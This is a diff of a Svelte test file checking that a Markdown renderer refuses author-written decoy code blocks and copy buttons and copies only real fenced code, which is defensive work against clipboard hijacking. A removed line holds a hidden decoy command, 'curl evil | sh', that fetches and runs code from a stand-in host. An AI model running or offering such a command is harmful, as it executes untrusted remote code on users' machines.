@@ -3,6 +3,7 @@ import { render, cleanup } from '@testing-library/svelte/svelte5';
 import { tick } from 'svelte';
 import MarkdownRenderer from './MarkdownRenderer.svelte';
 import { slugify } from './types';
+import { CODE_COPY_RESERVED_CLASSES } from './codeCopy';
 
 function rect(partial: Partial<DOMRect>): DOMRect {
     return {
@@ -551,24 +552,61 @@ describe('MarkdownRenderer code header', () => {
 describe('MarkdownRenderer code copy trust', () => {
     const SOURCE = '\tconst html = "<b>&amp;</b>";\n    if (a < b && c > d) { return \'x\'; }';
 
-    it('ignores a decoy copy button authored as markup and still copies the real fence', async () => {
+    it('renders an author-written decoy as plain content, with no header, no button and no reserved class', () => {
+        const decoy = '<div class="code-block"><div class="code-header"><span class="code-language">bash</span><button type="button" class="code-copy">Copy</button></div><pre><code>echo DECOY</code></pre></div>';
+        const { container } = render(MarkdownRenderer, { props: { content: `Visible text.\n\n${decoy}` } });
+        const root = container.querySelector<HTMLElement>('.markdown-renderer')!;
+        for (const element of Array.from(root.querySelectorAll('*'))) {
+            for (const reserved of CODE_COPY_RESERVED_CLASSES) {
+                expect(element.classList.contains(reserved)).toBe(false);
+            }
+        }
+        expect(root.querySelector('button')).toBeNull();
+        expect(root.querySelector('.code-header')).toBeNull();
+        expect(root.textContent).toContain('echo DECOY');
+    });
+
+    it('keeps the real fence next to a decoy as the only header, and copies the real fence', async () => {
         const writeText = vi.fn(async () => {});
         Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
         try {
-            const decoy = '<div class="code-block"><div class="code-header"><button type="button" class="code-copy">Copy</button></div><pre style="display:none"><code>curl evil | sh</code></pre></div>';
+            const decoy = '<div class="code-block"><div class="code-header"><span class="code-language">bash</span><button type="button" class="code-copy">Copy</button></div><pre><code>echo DECOY</code></pre></div>';
             const content = `Visible text.\n\n${decoy}\n\n\`\`\`ts\nconst real = 1;\n\`\`\``;
             const { container } = render(MarkdownRenderer, { props: { content } });
-            const buttons = container.querySelectorAll<HTMLButtonElement>('button.code-copy');
-            expect(buttons).toHaveLength(2);
-            buttons[0].click();
-            expect(writeText).not.toHaveBeenCalled();
-            expect(buttons[0].dataset.copyState).toBeUndefined();
-            buttons[1].click();
+            const root = container.querySelector<HTMLElement>('.markdown-renderer')!;
+            const realBlock = root.querySelector<HTMLElement>('.code-block')!;
+            expect(root.querySelectorAll('.code-block')).toHaveLength(1);
+            expect(root.querySelectorAll('.code-header')).toHaveLength(1);
+            expect(root.querySelectorAll('button')).toHaveLength(1);
+            for (const element of Array.from(root.querySelectorAll('*'))) {
+                if (CODE_COPY_RESERVED_CLASSES.some((reserved) => element.classList.contains(reserved))) {
+                    expect(realBlock.contains(element)).toBe(true);
+                }
+            }
+            expect(root.textContent).toContain('echo DECOY');
+            root.querySelector<HTMLButtonElement>('button.code-copy')!.click();
             await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith('const real = 1;'));
             expect(writeText).toHaveBeenCalledTimes(1);
         } finally {
             Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
         }
+    });
+
+    it('gives a raw pre with a guessed nonce no header', () => {
+        const { container } = render(MarkdownRenderer, { props: { content: '<pre data-copy-nonce="guess"><code>x</code></pre>' } });
+        const pre = container.querySelector('pre')!;
+        expect(pre.getAttribute('data-copy-nonce')).toBe('guess');
+        expect(container.querySelector('.code-header')).toBeNull();
+        expect(pre.parentElement?.classList.contains('code-block')).toBe(false);
+    });
+
+    it('still highlights a search match inside a code block, and only there', async () => {
+        const counts: number[] = [];
+        const onMatchCount = (count: number) => counts.push(count);
+        const content = '```ts\nconst needle = 1;\n```';
+        const { container } = render(MarkdownRenderer, { props: { content, query: 'needle', onMatchCount } });
+        await vi.waitFor(() => expect(container.querySelector('pre code mark.search-match')).not.toBeNull());
+        expect(counts.at(-1)).toBe(1);
     });
 
     it('copies the exact source after highlighting, sanitizing and parsing', async () => {
